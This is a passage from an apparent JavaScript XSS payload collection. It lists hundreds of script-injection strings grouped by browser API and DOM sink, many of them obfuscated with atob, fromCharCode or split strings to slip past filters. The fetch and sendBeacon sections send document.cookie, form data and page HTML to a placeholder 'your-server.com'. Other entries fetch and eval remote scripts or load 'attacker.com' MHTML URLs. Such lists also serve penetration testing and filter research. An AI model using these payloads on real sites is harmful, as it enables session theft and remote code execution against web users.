            '<script>new SharedWorker("data:text/javascript,onconnect=function(){alert(\'XSS\')}")</script>',
            '<script>new SharedWorker("data:text/javascript,importScripts(\'http://your-server.com/xss.js\')")</script>',
            '<script>new SharedWorker("data:text/javascript,fetch(\'http://your-server.com/xss.js\').then(r=>r.text()).then(eval)")</script>',
            '<script>new SharedWorker(URL.createObjectURL(new Blob([\'alert("XSS")\'])))</script>',
            '<script>new SharedWorker(URL.createObjectURL(new Blob([\'setInterval(function(){alert("XSS")}, 5000)\'])))</script>',
            '<script>var worker=new SharedWorker("data:text/javascript,alert(\'XSS\')");worker.port.start()</script>',
            '<script>var worker=new SharedWorker("data:text/javascript,onconnect=function(e){e.ports[0].postMessage("XSS");alert("XSS")}");worker.port.start()</script>',
            '<script>var worker=new SharedWorker("data:text/javascript,onconnect=function(e){e.ports[0].onmessage=function(){alert("XSS")}}");worker.port.postMessage("trigger")</script>'
        ],
        
        message_channel: [
            '<script>var channel=new MessageChannel();channel.port1.onmessage=function(){alert("XSS")};channel.port2.postMessage("trigger")</script>',
            '<script>var channel=new MessageChannel();channel.port2.onmessage=function(){alert("XSS")};channel.port1.postMessage("trigger")</script>',
            '<script>var channel=new MessageChannel();setTimeout(function(){channel.port1.postMessage("trigger")},1000);channel.port2.onmessage=function(){alert("XSS")}</script>',
            '<script>window.addEventListener("message",function(e){if(e.data==="xss")alert("XSS")});window.postMessage("xss","*")</script>',
            '<script>window.addEventListener("message",function(e){eval(e.data)});window.postMessage("alert(\'XSS\')","*")</script>',
            '<script>var bc=new BroadcastChannel("xss");bc.onmessage=function(){alert("XSS")};bc.postMessage("trigger")</script>',
            '<script>var bc=new BroadcastChannel("xss");bc.onmessage=function(e){eval(e.data)};bc.postMessage("alert(\'XSS\')")</script>'
        ],
        
        fetch_api: [
            '<script>fetch("http://your-server.com/xss.js").then(r=>r.text()).then(eval)</script>',
            '<script>fetch("data:text/javascript,alert(\'XSS\')").then(r=>r.text()).then(eval)</script>',
            '<script>fetch("http://your-server.com/xss").then(()=>alert("XSS"))</script>',
            '<script>fetch("http://your-server.com/xss",{method:"POST",body:document.cookie}).then(()=>alert("XSS"))</script>',
            '<script>fetch("http://your-server.com/xss",{method:"POST",body:JSON.stringify({cookies:document.cookie})}).then(()=>alert("XSS"))</script>',
            '<script>fetch("http://your-server.com/xss").then(r=>r.text()).then(d=>eval(d))</script>',
            '<script>fetch("http://your-server.com/xss").then(r=>r.json()).then(d=>alert("XSS"))</script>',
            '<script>fetch("http://your-server.com/xss",{credentials:"include"}).then(()=>alert("XSS"))</script>',
            '<script>fetch("http://your-server.com/xss",{mode:"no-cors"}).then(()=>alert("XSS"))</script>',
            '<script>fetch("http://your-server.com/xss",{redirect:"follow"}).then(()=>alert("XSS"))</script>'
        ],
        
        beacon_api: [
            '<script>navigator.sendBeacon("http://your-server.com/xss", document.cookie)</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", JSON.stringify({cookies:document.cookie}))</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", new Blob([document.cookie]))</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", "cookies="+document.cookie)</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", new FormData(document.querySelector("form")))</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", new URLSearchParams("cookies="+document.cookie))</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", new URLSearchParams({cookies:document.cookie}))</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", new Blob([JSON.stringify({cookies:document.cookie})]))</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", new Blob([document.body.innerHTML]))</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", new Blob([location.href]))</script>'
        ],
        
        image_capture: [
            '<script>navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{var track=stream.getVideoTracks()[0];var imageCapture=new ImageCapture(track);alert("XSS")})</script>',
            '<script>navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{var track=stream.getVideoTracks()[0];var imageCapture=new ImageCapture(track);imageCapture.takePhoto().then(()=>alert("XSS"))})</script>',
            '<script>navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{var track=stream.getVideoTracks()[0];var imageCapture=new ImageCapture(track);imageCapture.grabFrame().then(()=>alert("XSS"))})</script>',
            '<script>navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{var track=stream.getVideoTracks()[0];var imageCapture=new ImageCapture(track);imageCapture.getPhotoCapabilities().then(()=>alert("XSS"))})</script>',
            '<script>navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{var track=stream.getVideoTracks()[0];var imageCapture=new ImageCapture(track);alert("XSS")})</script>'
        ],
        
        presentation_api: [
            '<script>navigator.presentation.defaultRequest=new PresentationRequest(["http://your-server.com/xss.html"]);alert("XSS")</script>',
            '<script>navigator.presentation.defaultRequest=new PresentationRequest(["javascript:alert(\'XSS\')"]);alert("XSS")</script>',
            '<script>var presentation=new PresentationRequest(["http://your-server.com/xss.html"]);presentation.start().then(()=>alert("XSS"))</script>',
            '<script>var presentation=new PresentationRequest(["javascript:alert(\'XSS\')"]);presentation.start().then(()=>alert("XSS"))</script>',
            '<script>navigator.presentation.defaultRequest=new PresentationRequest(["data:text/html,<script>alert(\'XSS\')</script>"]);alert("XSS")</script>'
        ],
        
        web_share_api: [
            '<script>navigator.share({title:"XSS",text:"You are hacked!",url:"http://your-server.com/xss.html"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.share({title:"XSS",text:"You are hacked!"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.share({url:"http://your-server.com/xss.html"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.share({title:"XSS",text:"You are hacked!",url:"javascript:alert(\'XSS\')"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.share({title:"XSS",text:"You are hacked!",url:"data:text/html,<script>alert(\'XSS\')</script>"}).then(()=>alert("XSS"))</script>'
        ],
        
        web_bluetooth: [
            '<script>navigator.bluetooth.requestDevice({acceptAllDevices:true}).then(()=>alert("XSS"))</script>',
            '<script>navigator.bluetooth.requestDevice({filters:[{name:"XSS"}]}).then(()=>alert("XSS"))</script>',
            '<script>navigator.bluetooth.getAvailability().then(()=>alert("XSS"))</script>',
            '<script>navigator.bluetooth.addEventListener("availabilitychanged",()=>alert("XSS"))</script>',
            '<script>navigator.bluetooth.requestDevice({acceptAllDevices:true}).then(device=>{device.addEventListener("gattserverdisconnected",()=>alert("XSS"))})</script>'
        ],
        
        web_usb: [
            '<script>navigator.usb.requestDevice({filters:[{}]}).then(()=>alert("XSS"))</script>',
            '<script>navigator.usb.getDevices().then(()=>alert("XSS"))</script>',
            '<script>navigator.usb.addEventListener("connect",()=>alert("XSS"))</script>',
            '<script>navigator.usb.addEventListener("disconnect",()=>alert("XSS"))</script>',
            '<script>navigator.usb.requestDevice({filters:[{vendorId:0x1234}]}).then(()=>alert("XSS"))</script>'
        ],
        
        web_serial: [
            '<script>navigator.serial.requestPort().then(()=>alert("XSS"))</script>',
            '<script>navigator.serial.getPorts().then(()=>alert("XSS"))</script>',
            '<script>navigator.serial.addEventListener("connect",()=>alert("XSS"))</script>',
            '<script>navigator.serial.addEventListener("disconnect",()=>alert("XSS"))</script>',
            '<script>navigator.serial.requestPort({filters:[{usbVendorId:0x1234}]}).then(()=>alert("XSS"))</script>'
        ],
        
        web_nfc: [
            '<script>navigator.nfc.watch((message)=>alert("XSS"),{url:"/xss"})</script>',
            '<script>navigator.nfc.watch((message)=>alert("XSS"),{recordType:"text"})</script>',
            '<script>navigator.nfc.push("XSS").then(()=>alert("XSS"))</script>',
            '<script>navigator.nfc.push({records:[{recordType:"text",data:"XSS"}]}).then(()=>alert("XSS"))</script>',
            '<script>navigator.nfc.watch((message)=>alert("XSS"))</script>'
        ],
        
        webxr: [
            '<script>navigator.xr.isSessionSupported("immersive-vr").then(()=>alert("XSS"))</script>',
            '<script>navigator.xr.isSessionSupported("immersive-ar").then(()=>alert("XSS"))</script>',
            '<script>navigator.xr.requestSession("immersive-vr").then(()=>alert("XSS"))</script>',
            '<script>navigator.xr.requestSession("immersive-ar").then(()=>alert("XSS"))</script>',
            '<script>navigator.xr.addEventListener("devicechange",()=>alert("XSS"))</script>'
        ],
        
        file_api: [
            '<input type="file" onchange="alert(\'XSS\')">',
            '<input type="file" onfocus="alert(\'XSS\')" autofocus>',
            '<input type="file" onblur="alert(\'XSS\')">',
            '<input type="file" ondragover="alert(\'XSS\')">',
            '<input type="file" ondrop="alert(\'XSS\')">',
            '<script>document.querySelector("input[type=file]").addEventListener("change",()=>alert("XSS"))</script>',
            '<script>document.querySelector("input[type=file]").addEventListener("focus",()=>alert("XSS"))</script>',
            '<script>document.querySelector("input[type=file]").addEventListener("blur",()=>alert("XSS"))</script>',
            '<script>document.querySelector("input[type=file]").addEventListener("dragover",()=>alert("XSS"))</script>',
            '<script>document.querySelector("input[type=file]").addEventListener("drop",()=>alert("XSS"))</script>'
        ],
        
        drag_drop_advanced: [
            '<div draggable="true" ondragstart="alert(\'XSS\')">Drag me</div>',
            '<div ondragenter="alert(\'XSS\')">Drop here</div>',
            '<div ondragover="alert(\'XSS\')">Drop here</div>',
            '<div ondrop="alert(\'XSS\')">Drop here</div>',
            '<div ondragend="alert(\'XSS\')">Drag me</div>',
            '<div ondragexit="alert(\'XSS\')">Drop here</div>',
            '<div ondragleave="alert(\'XSS\')">Drop here</div>',
            '<div ondragover="return false" ondrop="alert(\'XSS\')">Drop here</div>',
            '<div draggable="true" ondragstart="eval(\'alert(\\\\\'XSS\\\\\')\')">Drag me</div>',
            '<div ondrop="eval(\'alert(\\\\\'XSS\\\\\')\')">Drop here</div>',
            '<script>document.addEventListener("dragstart",()=>alert("XSS"))</script>',
            '<script>document.addEventListener("dragend",()=>alert("XSS"))</script>',
            '<script>document.addEventListener("dragover",()=>alert("XSS"))</script>',
            '<script>document.addEventListener("drop",()=>alert("XSS"))</script>'
        ],
        
        clipboard_advanced: [
            '<div oncopy="alert(\'XSS\')">Copy me</div>',
            '<div oncut="alert(\'XSS\')">Cut me</div>',
            '<div onpaste="alert(\'XSS\')">Paste here</div>',
            '<input oncopy="alert(\'XSS\')" value="Copy me">',
            '<input oncut="alert(\'XSS\')" value="Cut me">',
            '<input onpaste="alert(\'XSS\')">',
            '<textarea oncopy="alert(\'XSS\')">Copy me</textarea>',
            '<textarea oncut="alert(\'XSS\')">Cut me</textarea>',
            '<textarea onpaste="alert(\'XSS\')">Paste here</textarea>',
            '<div contenteditable="true" oncopy="alert(\'XSS\')">Copy me</div>',
            '<div contenteditable="true" oncut="alert(\'XSS\')">Cut me</div>',
            '<div contenteditable="true" onpaste="alert(\'XSS\')">Paste here</div>',
            '<div oncopy="eval(\'alert(\\\\\'XSS\\\\\')\')">Copy me</div>',
            '<div oncut="eval(\'alert(\\\\\'XSS\\\\\')\')">Cut me</div>',
            '<div onpaste="eval(\'alert(\\\\\'XSS\\\\\')\')">Paste here</div>',
            '<script>document.addEventListener("copy",()=>alert("XSS"))</script>',
            '<script>document.addEventListener("cut",()=>alert("XSS"))</script>',
            '<script>document.addEventListener("paste",()=>alert("XSS"))</script>',
            '<script>navigator.clipboard.readText().then(()=>alert("XSS"))</script>',
            '<script>navigator.clipboard.writeText("XSS").then(()=>alert("XSS"))</script>'
        ],
        
        web_share_advanced: [
            '<script>navigator.share({title:"XSS",text:"You are hacked!",url:"http://your-server.com/xss.html"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.share({title:"XSS",text:"You are hacked!"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.share({url:"http://your-server.com/xss.html"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.share({title:"XSS",text:"You are hacked!",url:"javascript:alert(\'XSS\')"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.share({title:"XSS",text:"You are hacked!",url:"data:text/html,<script>alert(\'XSS\')</script>"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.share({files:[new File(["XSS"],"xss.txt")]}).then(()=>alert("XSS"))</script>',
            '<script>navigator.canShare&&navigator.canShare({title:"XSS"})&&alert("XSS")</script>',
            '<script>navigator.share({title:"XSS",text:"You are hacked!",url:window.location.href}).then(()=>alert("XSS"))</script>'
        ]
    },
    
    dom: {
        location: [
            'javascript:alert("XSS")',
            'javascript:alert(document.cookie)',
            'javascript:alert(document.domain)',
            'javascript:eval("alert(\'XSS\')")',
            'javascript:Function("alert(\'XSS\')")()',
            '#javascript:alert("XSS")',
            '#<script>alert("XSS")</script>',
            '#<img src=x onerror=alert("XSS")>',
            '#<svg onload=alert("XSS")>',
            '#alert("XSS")',
            '#eval("alert(\'XSS\')")',
            '#Function("alert(\'XSS\')")()',
            '#String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)',
            '#window["alert"]("XSS")',
            '#window["al"+"ert"]("XSS")',
            '#atob("YWxlcnQoIlhTUyIp")',
            '#eval(atob("YWxlcnQoIlhTUyIp"))'
        ],
        
        hash: [
            '#<script>alert("XSS")</script>',
            '#<img src=x onerror=alert("XSS")>',
            '#<svg onload=alert("XSS")>',
            '#alert("XSS")',
            '#eval("alert(\'XSS\')")',
            '#Function("alert(\'XSS\')")()',
            '#String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)',
            '#window["alert"]("XSS")',
            '#window["al"+"ert"]("XSS")',
            '#atob("YWxlcnQoIlhTUyIp")',
            '#eval(atob("YWxlcnQoIlhTUyIp"))',
            '#javascript:alert("XSS")',
            '#javascript:alert(document.cookie)',
            '#javascript:eval("alert(\'XSS\')")',
            '#vbscript:MsgBox("XSS")',
            '#data:text/html,<script>alert("XSS")</script>',
            '#data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='
        ],
        
        name: [
            '<script>window.name="javascript:alert(\'XSS\')";location.href=window.name</script>',
            '<script>window.name="<script>alert(\'XSS\')<\/script>";document.write(window.name)</script>',
            '<script>window.name="<img src=x onerror=alert(\'XSS\')>";document.write(window.name)</script>',
            '<script>window.name="alert(\'XSS\')";eval(window.name)</script>',
            '<script>window.name="String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)";eval(window.name)</script>',
            '<script>window.name="atob(\\"YWxlcnQoIlhTUyIp\\")";eval(atob(window.name))</script>',
            '<script>window.name="javascript:alert(document.cookie)";location.href=window.name</script>',
            '<script>window.name="data:text/html,<script>alert(\'XSS\')<\/script>";location.href=window.name</script>',
            '<script>window.name="vbscript:MsgBox(\\"XSS\\")";location.href=window.name</script>',
            '<script>window.name="mhtml:http://attacker.com/xss.mht!xss.html";location.href=window.name</script>'
        ],
        
        postMessage: [
            '<script>window.addEventListener("message",function(e){if(e.data==="xss")alert("XSS")});window.postMessage("xss","*")</script>',
            '<script>window.addEventListener("message",function(e){eval(e.data)});window.postMessage("alert(\'XSS\')","*")</script>',
            '<script>window.addEventListener("message",function(e){eval(atob(e.data))});window.postMessage("YWxlcnQoIlhTUyIp","*")</script>',
            '<script>window.addEventListener("message",function(e){new Function(e.data)()});window.postMessage("alert(\'XSS\')","*")</script>',
            '<script>window.addEventListener("message",function(e){window[e.data.split("(")[0]](e.data.split("(")[1].split(")")[0])});window.postMessage("alert(\'XSS\')","*")</script>',
            '<script>var channel=new MessageChannel();channel.port1.onmessage=function(e){if(e.data==="xss")alert("XSS")};channel.port2.postMessage("xss")</script>',
            '<script>var channel=new MessageChannel();channel.port1.onmessage=function(e){eval(e.data)};channel.port2.postMessage("alert(\'XSS\')")</script>',
            '<script>var bc=new BroadcastChannel("xss");bc.onmessage=function(e){if(e.data==="xss")alert("XSS")};bc.postMessage("xss")</script>',
            '<script>var bc=new BroadcastChannel("xss");bc.onmessage=function(e){eval(e.data)};bc.postMessage("alert(\'XSS\')")</script>',
            '<script>window.addEventListener("message",function(e){if(e.origin==="http://your-server.com")alert("XSS")});window.postMessage("xss","http://your-server.com")</script>'
        ],
        
        localStorage: [
            '<script>localStorage.setItem("xss","<script>alert(\'XSS\')<\/script>");document.write(localStorage.getItem("xss"))</script>',
            '<script>localStorage.setItem("xss","<img src=x onerror=alert(\'XSS\')>");document.write(localStorage.getItem("xss"))</script>',
            '<script>localStorage.setItem("xss","javascript:alert(\'XSS\')");location.href=localStorage.getItem("xss")</script>',
            '<script>localStorage.setItem("xss","alert(\'XSS\')");eval(localStorage.getItem("xss"))</script>',
            '<script>localStorage.setItem("xss","String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)");eval(localStorage.getItem("xss"))</script>',
            '<script>localStorage.setItem("xss","atob(\\"YWxlcnQoIlhTUyIp\\")");eval(atob(localStorage.getItem("xss")))</script>',
            '<script>localStorage.setItem("xss","vbscript:MsgBox(\\"XSS\\")");location.href=localStorage.getItem("xss")</script>',
            '<script>localStorage.setItem("xss","data:text/html,<script>alert(\'XSS\')<\/script>");location.href=localStorage.getItem("xss")</script>',
            '<script>localStorage.setItem("xss","mhtml:http://attacker.com/xss.mht!xss.html");location.href=localStorage.getItem("xss")</script>',
            '<script>localStorage.setItem("xss","#<script>alert(\'XSS\')<\/script>");location.hash=localStorage.getItem("xss")</script>'
        ],
        
        sessionStorage: [
            '<script>sessionStorage.setItem("xss","<script>alert(\'XSS\')<\/script>");document.write(sessionStorage.getItem("xss"))</script>',
            '<script>sessionStorage.setItem("xss","<img src=x onerror=alert(\'XSS\')>");document.write(sessionStorage.getItem("xss"))</script>',
            '<script>sessionStorage.setItem("xss","javascript:alert(\'XSS\')");location.href=sessionStorage.getItem("xss")</script>',
            '<script>sessionStorage.setItem("xss","alert(\'XSS\')");eval(sessionStorage.getItem("xss"))</script>',
            '<script>sessionStorage.setItem("xss","String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)");eval(sessionStorage.getItem("xss"))</script>',
            '<script>sessionStorage.setItem("xss","atob(\\"YWxlcnQoIlhTUyIp\\")");eval(atob(sessionStorage.getItem("xss")))</script>',
            '<script>sessionStorage.setItem("xss","vbscript:MsgBox(\\"XSS\\")");location.href=sessionStorage.getItem("xss")</script>',
            '<script>sessionStorage.setItem("xss","data:text/html,<script>alert(\'XSS\')<\/script>");location.href=sessionStorage.getItem("xss")</script>',
            '<script>sessionStorage.setItem("xss","mhtml:http://attacker.com/xss.mht!xss.html");location.href=sessionStorage.getItem("xss")</script>',
            '<script>sessionStorage.setItem("xss","#<script>alert(\'XSS\')<\/script>");location.hash=sessionStorage.getItem("xss")</script>'
        ],
        
        cookies: [
            '<script>document.cookie="xss=<script>alert(\'XSS\')<\/script>";document.write(document.cookie)</script>',
            '<script>document.cookie="xss=<img src=x onerror=alert(\'XSS\')>";document.write(document.cookie)</script>',
            '<script>document.cookie="xss=javascript:alert(\'XSS\')";location.href=document.cookie.split("xss=")[1]</script>',
            '<script>document.cookie="xss=alert(\'XSS\')";eval(document.cookie.split("xss=")[1])</script>',
            '<script>document.cookie="xss=String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)";eval(document.cookie.split("xss=")[1])</script>',
            '<script>document.cookie="xss=atob(\\"YWxlcnQoIlhTUyIp\\")";eval(atob(document.cookie.split("xss=")[1]))</script>',
            '<script>document.cookie="xss=vbscript:MsgBox(\\"XSS\\")";location.href=document.cookie.split("xss=")[1]</script>',
            '<script>document.cookie="xss=data:text/html,<script>alert(\'XSS\')<\/script>";location.href=document.cookie.split("xss=")[1]</script>',
            '<script>document.cookie="xss=mhtml:http://attacker.com/xss.mht!xss.html";location.href=document.cookie.split("xss=")[1]</script>',
            '<script>document.cookie="xss=#<script>alert(\'XSS\')<\/script>";location.hash=document.cookie.split("xss=")[1]</script>'
        ],
        
        document_write: [
            '<script>document.write("<script>alert(\'XSS\')<\/script>")</script>',
            '<script>document.write("<img src=x onerror=alert(\'XSS\')>")</script>',
            '<script>document.write("<svg onload=alert(\'XSS\')>")</script>',
            '<script>document.write("<iframe src=javascript:alert(\'XSS\')>")</script>',
            '<script>document.write("<embed src=javascript:alert(\'XSS\')>")</script>',
            '<script>document.write("<object data=javascript:alert(\'XSS\')>")</script>',
            '<script>document.write("<form action=javascript:alert(\'XSS\')><input type=submit>")</script>',
            '<script>document.write("<button onclick=alert(\'XSS\')>Click me</button>")</script>',
            '<script>document.write("<a href=javascript:alert(\'XSS\')>Click me</a>")</script>',
            '<script>document.write("<input onfocus=alert(\'XSS\') autofocus>")</script>'
        ],
        
        eval_based: [
            '<script>eval("alert(\'XSS\')")</script>',
            '<script>eval("alert(document.cookie)")</script>',
            '<script>eval("alert(document.domain)")</script>',
            '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
            '<script>eval(unescape("alert%28%22XSS%22%29"))</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
            '<script>eval(location.hash.slice(1))</script>',
            '<script>eval(location.search.slice(1))</script>',
            '<script>eval(name)</script>',
            '<script>eval(document.cookie)</script>',
            '<script>eval(document.referrer)</script>',
            '<script>eval(window.name)</script>',
            '<script>eval(frames[0].name)</script>',
            '<script>eval(parent.name)</script>',
            '<script>eval(top.name)</script>'
        ],
        
        setTimeout_interval: [
            '<script>setTimeout("alert(\'XSS\')", 0)</script>',
            '<script>setTimeout("alert(\'XSS\')", 1000)</script>',
            '<script>setTimeout("alert(\'XSS\')", 5000)</script>',
            '<script>setTimeout("alert(document.cookie)", 1000)</script>',
            '<script>setTimeout("alert(document.domain)", 1000)</script>',
            '<script>setTimeout(atob("YWxlcnQoIlhTUyIp"), 1000)</script>',
            '<script>setTimeout(unescape("alert%28%22XSS%22%29"), 1000)</script>',
            '<script>setTimeout(function(){alert("XSS")}, 1000)</script>',
            '<script>setTimeout(function(){eval("alert(\'XSS\')")}, 1000)</script>',
            '<script>setTimeout(function(){eval(atob("YWxlcnQoIlhTUyIp"))}, 1000)</script>',
            '<script>setInterval("alert(\'XSS\')", 1000)</script>',
            '<script>setInterval("alert(\'XSS\')", 5000)</script>',
            '<script>setInterval("alert(document.cookie)", 10000)</script>',
            '<script>setInterval(function(){alert("XSS")}, 1000)</script>',
            '<script>setInterval(function(){eval("alert(\'XSS\')")}, 1000)</script>'
        ],
        
        function_constructor: [
            '<script>new Function("alert(\'XSS\')")()</script>',
            '<script>new Function("alert(document.cookie)")()</script>',
            '<script>new Function("alert(document.domain)")()</script>',
            '<script>new Function(atob("YWxlcnQoIlhTUyIp"))()</script>',
            '<script>new Function(unescape("alert%28%22XSS%22%29"))()</script>',
            '<script>new Function(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()</script>',
            '<script>Function("alert(\'XSS\')")()</script>',
            '<script>Function("alert(document.cookie)")()</script>',
            '<script>Function("alert(document.domain)")()</script>',
            '<script>Function(atob("YWxlcnQoIlhTUyIp"))()</script>',
            '<script>Function(unescape("alert%28%22XSS%22%29"))()</script>',
            '<script>Function(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()</script>'
        ],
        
        window_object: [
            '<script>window.alert("XSS")</script>',
            '<script>window["alert"]("XSS")</script>',
            '<script>window["al"+"ert"]("XSS")</script>',
            '<script>window[String.fromCharCode(97,108,101,114,116)]("XSS")</script>',
            '<script>window[atob("YWxlcnQ")]("XSS")</script>',
            '<script>window[unescape("alert")]("XSS")</script>',
            '<script>window.alert(document.cookie)</script>',
            '<script>window.alert(document.domain)</script>',
            '<script>window[\'alert\'](\'XSS\')</script>',
            '<script>window[`alert`](`XSS`)</script>',
            '<script>window.alert`XSS`</script>',
            '<script>window.alert(/**/\'XSS\'/**/)</script>',
            '<script>window.alert(/XSS/.source)</script>'
        ],
        
        frame_object: [
            '<script>frames[0].alert("XSS")</script>',
            '<script>frames[0]["alert"]("XSS")</script>',
            '<script>frames[0]["al"+"ert"]("XSS")</script>',
            '<script>frames[0][String.fromCharCode(97,108,101,114,116)]("XSS")</script>',
            '<script>frames[0][atob("YWxlcnQ")]("XSS")</script>',
            '<script>frames[0][unescape("alert")]("XSS")</script>',
            '<script>frames[0].alert(document.cookie)</script>',
            '<script>frames[0].alert(document.domain)</script>',
            '<script>parent.frames[0].alert("XSS")</script>',
            '<script>top.frames[0].alert("XSS")</script>',
            '<script>window.frames[0].alert("XSS")</script>',
            '<script>self.frames[0].alert("XSS")</script>'
        ],
        
        parent_object: [
            '<script>parent.alert("XSS")</script>',
            '<script>parent["alert"]("XSS")</script>',
            '<script>parent["al"+"ert"]("XSS")</script>',
            '<script>parent[String.fromCharCode(97,108,101,114,116)]("XSS")</script>',
            '<script>parent[atob("YWxlcnQ")]("XSS")</script>',
            '<script>parent[unescape("alert")]("XSS")</script>',
            '<script>parent.alert(document.cookie)</script>',
            '<script>parent.alert(document.domain)</script>',
            '<script>parent.frames[0].alert("XSS")</script>',
            '<script>parent.parent.alert("XSS")</script>',
            '<script>window.parent.alert("XSS")</script>',
            '<script>self.parent.alert("XSS")</script>'
        ],
        
        top_object: [
            '<script>top.alert("XSS")</script>',
            '<script>top["alert"]("XSS")</script>',
            '<script>top["al"+"ert"]("XSS")</script>',
            '<script>top[String.fromCharCode(97,108,101,114,116)]("XSS")</script>',
            '<script>top[atob("YWxlcnQ")]("XSS")</script>',
            '<script>top[unescape("alert")]("XSS")</script>',
            '<script>top.alert(document.cookie)</script>',
            '<script>top.alert(document.domain)</script>',
            '<script>top.frames[0].alert("XSS")</script>',
            '<script>top.parent.alert("XSS")</script>',
            '<script>window.top.alert("XSS")</script>',
            '<script>self.top.alert("XSS")</script>'
        ],
        
        self_object: [
            '<script>self.alert("XSS")</script>',
            '<script>self["alert"]("XSS")</script>',
            '<script>self["al"+"ert"]("XSS")</script>',
            '<script>self[String.fromCharCode(97,108,101,114,116)]("XSS")</script>',
            '<script>self[atob("YWxlcnQ")]("XSS")</script>',
            '<script>self[unescape("alert")]("XSS")</script>',
            '<script>self.alert(document.cookie)</script>',
            '<script>self.alert(document.domain)</script>',
            '<script>self.frames[0].alert("XSS")</script>',
            '<script>self.parent.alert("XSS")</script>',
            '<script>self.top.alert("XSS")</script>',
            '<script>window.self.alert("XSS")</script>'
        ],
        
        history_object: [
            '<script>history.pushState({xss:true}, "xss", "#xss");alert("XSS")</script>',
            '<script>history.replaceState({xss:true}, "xss", "#xss");alert("XSS")</script>',
            '<script>history.pushState({}, "", "#<script>alert(\'XSS\')<\/script>");location.hash="#<script>alert(\'XSS\')<\/script>"</script>',
            '<script>history.replaceState({}, "", "#javascript:alert(\'XSS\')");location.hash="#javascript:alert(\'XSS\')"</script>',
            '<script>history.pushState({}, "", "data:text/html,<script>alert(\'XSS\')<\/script>");location.href="data:text/html,<script>alert(\'XSS\')<\/script>"</script>',
            '<script>history.replaceState({}, "", "javascript:alert(\'XSS\')");location.href="javascript:alert(\'XSS\')"</script>',
            '<script>window.addEventListener("popstate",function(){alert("XSS")});history.pushState({xss:true}, "xss", "#xss")</script>',
            '<script>window.addEventListener("hashchange",function(){alert("XSS")});history.pushState({xss:true}, "xss", "#xss")</script>',
            '<script>history.pushState({xss:true}, "xss", "#xss");window.dispatchEvent(new PopStateEvent("popstate"))</script>',
            '<script>history.replaceState({xss:true}, "xss", "#xss");window.dispatchEvent(new PopStateEvent("popstate"))</script>'
        ],
        
        location_object: [
            '<script>location.href="javascript:alert(\'XSS\')"</script>',
            '<script>location.href="data:text/html,<script>alert(\'XSS\')<\/script>"</script>',
            '<script>location.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="</script>',
            '<script>location.href="vbscript:MsgBox(\'XSS\')"</script>',
            '<script>location.href="mhtml:http://attacker.com/xss.mht!xss.html"</script>',
            '<script>location.href="#<script>alert(\'XSS\')<\/script>"</script>',
            '<script>location.href="#javascript:alert(\'XSS\')"</script>',
            '<script>location.href="#"+atob("amF2YXNjcmlwdDphbGVydCgnWFNTJyk=")</script>',
            '<script>location.replace("javascript:alert(\'XSS\')")</script>',
            '<script>location.assign("javascript:alert(\'XSS\')")</script>',
            '<script>location="javascript:alert(\'XSS\')"</script>',
            '<script>location="data:text/html,<script>alert(\'XSS\')<\/script>"</script>'
        ],
        
        document_object: [
            '<script>document.write("<script>alert(\'XSS\')<\/script>")</script>',
            '<script>document.write("<img src=x onerror=alert(\'XSS\')>")</script>',
            '<script>document.write("<svg onload=alert(\'XSS\')>")</script>',
            '<script>document.write("<iframe src=javascript:alert(\'XSS\')>")</script>',
            '<script>document.write("<embed src=javascript:alert(\'XSS\')>")</script>',
            '<script>document.write("<object data=javascript:alert(\'XSS\')>")</script>',
            '<script>document.write("<form action=javascript:alert(\'XSS\')><input type=submit>")</script>',
            '<script>document.write("<button onclick=alert(\'XSS\')>Click me</button>")</script>',
            '<script>document.write("<a href=javascript:alert(\'XSS\')>Click me</a>")</script>',
            '<script>document.write("<input onfocus=alert(\'XSS\') autofocus>")</script>',
            '<script>document.writeln("<script>alert(\'XSS\')<\/script>")</script>',
            '<script>document.open();document.write("<script>alert(\'XSS\')<\/script>");document.close()</script>',
            '<script>document.open("text/html");document.write("<script>alert(\'XSS\')<\/script>");document.close()</script>',
            '<script>document.open("text/html","replace");document.write("<script>alert(\'XSS\')<\/script>");document.close()</script>'
        ],
        
        open_method: [
            '<script>window.open("javascript:alert(\'XSS\')")</script>',
            '<script>window.open("data:text/html,<script>alert(\'XSS\')<\/script>")</script>',
            '<script>window.open("data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=")</script>',
            '<script>window.open("vbscript:MsgBox(\'XSS\')")</script>',
            '<script>window.open("mhtml:http://attacker.com/xss.mht!xss.html")</script>',
            '<script>window.open("#<script>alert(\'XSS\')<\/script>")</script>',
            '<script>window.open("#javascript:alert(\'XSS\')")</script>',
